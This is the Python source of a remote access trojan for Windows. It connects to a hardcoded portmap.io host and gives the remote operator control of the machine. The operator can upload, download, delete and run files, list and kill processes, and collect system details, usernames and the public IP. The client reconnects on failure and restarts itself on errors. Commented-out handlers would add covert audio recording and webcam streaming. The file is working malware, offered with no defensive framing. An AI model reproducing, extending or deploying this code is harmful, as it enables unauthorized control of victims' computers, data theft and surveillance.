HOST = "pythonbugla-22626.portmap.io"
PORT = int(22626)

import socket
import os
from ctypes import Structure, windll, c_uint, sizeof, byref
import time
import sys
import wmi
import platform
import ifaddr
from requests import get
import getpass
import psutil
# import sounddevice as sd
# from scipy.io.wavfile import write
# import wavio as wv
import os



class LASTINPUTINFO(Structure):
    _fields_ = [
        ('cbSize', c_uint),
        ('dwTime', c_uint),
    ]


def idle_time():
    lastInputInfo = LASTINPUTINFO()
    lastInputInfo.cbSize = sizeof(lastInputInfo)
    windll.user32.GetLastInputInfo(byref(lastInputInfo))
    millis = windll.kernel32.GetTickCount() - lastInputInfo.dwTime
    return millis / 1000.0

onstartup = True

def convert_list_to_string(org_list, seperator='\n'):
    """ Convert list to string, by joining all item in list with given separator.
        Returns the concatenated string """
    return seperator.join(org_list)

def socket_connect():
    try:
        s.connect((HOST, PORT))
    except Exception:
        time.sleep(3)
        print("\nReconnecting...")
        socket_connect()

def execute_commands():
    print("Connected successfully!")
    while True:
        try:
            command = s.recv(1024)
            command = command.decode()

            if command == "pwd":
                try:
                    get_cwd = os.getcwd()
                    msg = str(get_cwd + "\n")
                    s.send(msg.encode())
                except:
                    msg = "\n[-] Could not print working directory\n"
                    s.send(msg.encode())
            elif "cd" in command:
                try:
                    user_input = s.recv(5000)
                    user_input = user_input.decode()
                    os.chdir(user_input)
                    msg = str("\nDirectory has been changed\n")
                    s.send(msg.encode())
                except:
                    msg = str("\n[-] The path could not be found\n")
                    s.send(msg.encode())

            elif "download" in command:
                file_path = s.recv(5000)
                file_path = file_path.decode()
                if os.path.exists(file_path):
                    file = open(file_path, "rb")
                    msg = file.read()
                    s.send(msg)
                else:
                    msg = b'ErrorFileNotFound'
                    s.send(msg)

            elif command == "ls":
                try:
                    files = [f for f in os.listdir('.') if os.path.isfile(f)]
                    dirs = [d for d in os.listdir('.') if os.path.isdir(d)]
                    files = convert_list_to_string(files)
                    dirs = convert_list_to_string(dirs)
                    dirs = "\n\n*******************\n*** DIRECTORIES ***\n*******************\n" + dirs
                    files = "\n\n*******************\n****** FILES ******\n*******************\n" + files
                    dirs_files_str = dirs + files + "\n"
                    msg = str(dirs_files_str)
                    s.send(msg.encode())
                except:
                    msg = "[-] Could not list the directory"
                    s.send(msg.encode())

            elif command == "cd ..":
                try:
                    os.chdir("..")
                    get_cwd = os.getcwd()
                    msg = str('[+] '+get_cwd + "\n")
                    s.send(msg.encode())
                except:
                    msg = "[-] Could not change the directory"
                    s.send(msg.encode())

            elif "rm" in command:
                try:
                    file = s.recv(6000)
                    file = file.decode()
                    os.remove(file)
                    msg = "\n[+] " + file + " has been removed\n"
                    s.send(msg.encode())
                except:
                    msg = "\n[-] File has NOT been removed (does it exist?)\n"
                    s.send(msg.encode())

            elif "upload" in command:
                try:
                    filename = s.recv(7000)
                    filename = filename.decode()
                    filename = filename.split('FILECONTENT')
                    new_file = open(filename[0], "wb")
                    new_file.write(filename[1].encode())
                    new_file.close()
                    filename_in_msg = str(filename[0])
                    msg = "\n[+] File " + filename_in_msg + " uploaded correctly. \n"
                    s.send(msg.encode())
                except:
                    s.send("\n[-] Could not upload a file. \n".encode())

            elif command == "info":
                try:
                    computer = wmi.WMI()
                    os_info = computer.Win32_OperatingSystem()[0]
                    proc_info = computer.Win32_Processor()[0]
                    gpu_info = computer.Win32_VideoController()[0]
                    user = getpass.getuser()

                    windows_version = platform.version().split('.')
                    os_version = ' '.join([os_info.Version, os_info.BuildNumber])
                    system_ram = float(os_info.TotalVisibleMemorySize) / 1048576  # KB to GB
                    msg = str('\n[+] Computer information:\n'
                              '\nOS Name: {0}'.format(platform.system() + " " + windows_version[0]) + "\n" +
                              'OS Version: {0}'.format(os_version) + '\n'
                              'CPU: {0}'.format(proc_info.Name) + '\n' +
                              'RAM: {0} GB'.format(system_ram) + '\n' +
                              'Graphics Card: {0}'.format(gpu_info.Name + '\n'+
                              'Username: {0}'.format(user)+'\n'))
                    msg = msg.encode()
                    s.send(msg)
                except:
                    msg = "[-] Could not get computer information"
                    s.send(msg.encode())

            elif command == "ifconfig":
                try:
                    adapters = ifaddr.get_adapters()
                    msg = ""
                    for adapter in adapters:
                        title = str("\n\nNetwork adapter name: '" + adapter.nice_name + "':\n")
                        msg += title
                        for ip in adapter.ips:
                            desc = str("   IP: %s/%s" % (ip.ip, ip.network_prefix))
                            msg += desc
                    msg += "\n"
                    ip = get('https://api.ipify.org').text

                    msg += "\nPublic IP address: " + ip + "\n"
                    s.send(msg.encode())
                except:
                    msg = "[-] Could not get network adapters"
                    s.send(msg.encode())
            elif "run" in command:
                try:
                    file = s.recv(6000)
                    file.decode()
                    os.startfile(file)
                    msg = "[+] " + str(file) + " executed successfully"
                    s.send(msg.encode())
                except:
                    msg = "[-] Could not execute the file"
                    s.send(msg.encode())

            elif command == "ps":
                try:
                    f = wmi.WMI()
                    x = ""
                    # Printing the header for the later columns
                    x += "\n[+] Processes list\n"
                    x += "\n| PID | Process name |\n"
                    x += "``````````````````````\n"

                    # Iterating through all the running processes
                    for process in f.Win32_Process():
                        # Displaying the P_ID and P_Name of the process

                        x += str(process.ProcessId) + "     " + str(process.Name) + "\n"

                    s.send(x.encode())
                except:
                    msg = "[-] Could not print processes list"
                    s.send(msg.encode())


            elif command == "idletime":
                try:
                    x = ""
                    x += "[+] Idletime: "+str(idle_time())
                    s.send(x.encode())
                except:
                    msg = "[-] Could not get idle time"
                    s.send(msg.encode())

            elif "kill" in command:
                try:
                    PROC_NAME = s.recv(2048)
                    PROC_NAME = PROC_NAME.decode()
                    PROC_NAME = str(PROC_NAME)

                    for proc in psutil.process_iter():
                        # check whether the process to kill name matches
                        if proc.name() == PROC_NAME:
                            proc.kill()
                            msg = "Process has been terminated successfully\n"
                            s.send(msg.encode())
                except:
                    msg = "[-] Problem during process termination"
                    s.send(msg.encode())

            # elif "record" in command:
            #     try:
            #         name = s.recv(2048)
            #         name = name.decode()
            #         # Sampling frequency
            #         freq = 22050
            #         # Recording duration
            #         duration = 60
            #
            #         # Start recorder with the given values
            #         # of duration and sample frequency
            #         recording = sd.rec(int(duration * freq),
            #                            samplerate=freq, channels=2)
            #
            #         # Record audio for the given number of seconds
            #         print("Before recording")
            #         sd.wait()
            #         print("After recording")
            #
            #         # This will convert the NumPy array to an audio
            #         # file with the given sampling frequency
            #         # write("recording0.wav", freq, recording)
            #
            #         # Convert the NumPy array to audio file
            #         account = getpass.getuser()
            #         print("Before saving")
            #         wv.write("C:\\Users\\%s\\AppData\\Local\\"%account +name, recording, freq, sampwidth=2)
            #         print("After saving")
            #         file = open("C:\\Users\\%s\\AppData\\Local\\"%account +name, "rb")
            #         msg = file.read()
            #         s.send(msg)
            #     except:
            #         msg = b"ErrorFileNotFound"
            #         s.send(msg)


            # elif command == "webcam_stream":
            #     try:
            #         s.send(b'')
            #         cam = cv2.VideoCapture(0)
            #
            #         cam.set(3, 320)
            #         cam.set(4, 240)
            #
            #         img_counter = 0
            #
            #         encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), 90]
            #
            #         while True:
            #             ret, frame = cam.read()
            #             readed = True
            #             print("before")
            #
            #             result, frame = cv2.imencode('.jpg', frame, encode_param)
            #             print("After")
            #             data = pickle.dumps(frame, 0)
            #             size = len(data)
            #
            #             s.sendall(struct.pack(">L", size) + data)
            #             img_counter += 1
            #
            #         cam.release()
            #     except Exception:
            #
            #         print(Exception)
            #         msg = b"bad"
            #         s.send(msg)


            elif command == "status_check":
                s.send(b'status_ok')

        except Exception:
            os.execl(sys.executable, os.path.abspath(__file__), *sys.argv)

if __name__ == "__main__":
    s = socket.socket()
    socket_connect()
    execute_commands()
